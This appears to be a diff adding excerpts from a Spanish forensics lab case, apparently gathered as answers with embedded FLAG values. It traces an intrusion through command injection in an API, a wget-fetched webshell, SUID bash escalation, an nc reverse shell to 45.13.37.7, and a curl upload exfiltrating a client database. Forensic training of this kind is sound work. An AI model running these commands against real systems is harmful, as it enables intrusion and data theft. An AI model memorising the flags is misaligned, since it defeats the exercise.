@@ -1,0 +1,27 @@
+=== R3 — historial de memoria ===
+5:find / -perm -4000 -type f 2>/dev/null
+6:/usr/local/bin/system-check -p -c 'id'
+7:echo FLAG{dfir_privesc_suid}
+10:history -c
+
+=== R3 — procesos y SUID ===
+.loot/lab11-grupo07/pristine/labs/lab11-forensia/caso\disco\listado.txt:5:2026-09-05 02:21  1113504 /usr/local/bin/system-check      (SUID root - copia de bash)
+.loot/lab11-grupo07/pristine/labs/lab11-forensia/caso\memoria\lsof.txt:4:1477  system-check  txt   REG    /usr/local/bin/system-check
+.loot/lab11-grupo07/pristine/labs/lab11-forensia/caso\memoria\pslist.txt:8:1477  1240  root      system-check    <- SUID root (escalada); euid=0
+.loot/lab11-grupo07/pristine/labs/lab11-forensia/caso\memoria\pslist.txt:9:1490  1477  root      nc 45.13.37.7 4444   <- reverse shell / C2
+
+=== R4 — C2, archivo staged y upload command ===
+.loot/lab11-grupo07/pristine/labs/lab11-forensia/caso\memoria\lsof.txt:3:1490  nc            3u    IPv4   10.0.0.5:41022->45.13.37.7:4444
+.loot/lab11-grupo07/pristine/labs/lab11-forensia/caso\memoria\lsof.txt:5:1240  bash          1w    REG    /tmp/.exfil/clientes.tar.gz
+.loot/lab11-grupo07/pristine/labs/lab11-forensia/caso\memoria\netstat.txt:4:tcp   10.0.0.5:41022        45.13.37.7:4444     ESTABLISHED  1490  nc        <- C2 saliente
+.loot/lab11-grupo07/pristine/labs/lab11-forensia/caso\memoria\netstat.txt:5:tcp   10.0.0.5:41108        45.13.37.7:80       TIME_WAIT    1201  wget      <- descarga del webshell
+.loot/lab11-grupo07/pristine/labs/lab11-forensia/caso\memoria\bash_history.txt:4:wget http://45.13.37.7/s.php -O /var/www/uploads/shell.php
+.loot/lab11-grupo07/pristine/labs/lab11-forensia/caso\memoria\bash_history.txt:8:tar czf /tmp/.exfil/clientes.tar.gz /app/priv/clientes.db.txt
+.loot/lab11-grupo07/pristine/labs/lab11-forensia/caso\memoria\bash_history.txt:9:curl -s -F "f=@/tmp/.exfil/clientes.tar.gz" http://45.13.37.7/upload?tag=FLAG{dfir_c2_exfil}
+
+=== Correlacion temporal — access.log UTC ===
+18:185.220.101.42 - - [05/Sep/2026:02:18:10 +0000] "GET /api/reporte?token=phantom-api-7c1e&cmd=id HTTP/1.1" 200 60 "-" "curl/8.5"
+19:185.220.101.42 - - [05/Sep/2026:02:18:33 +0000] "GET /api/reporte?token=phantom-api-7c1e&cmd=echo%20FLAG%7Bdfir_vector_sqli%7D%20%3E%20/tmp/.p HTTP/1.1" 200 12 "-" "curl/8.5"
+20:185.220.101.42 - - [05/Sep/2026:02:19:02 +0000] "GET /api/reporte?token=phantom-api-7c1e&cmd=wget%20http://45.13.37.7/s.php%20-O%20/var/www/uploads/shell.php HTTP/1.1" 200 5 "-" "curl/8.5"
+21:185.220.101.42 - - [05/Sep/2026:02:19:48 +0000] "GET /uploads/shell.php?c=whoami HTTP/1.1" 200 9 "-" "curl/8.5"
+22:185.220.101.42 - - [05/Sep/2026:02:23:15 +0000] "GET /uploads/shell.php?c=cat%20/app/priv/clientes.db.txt HTTP/1.1" 200 48210 "-" "curl/8.5"
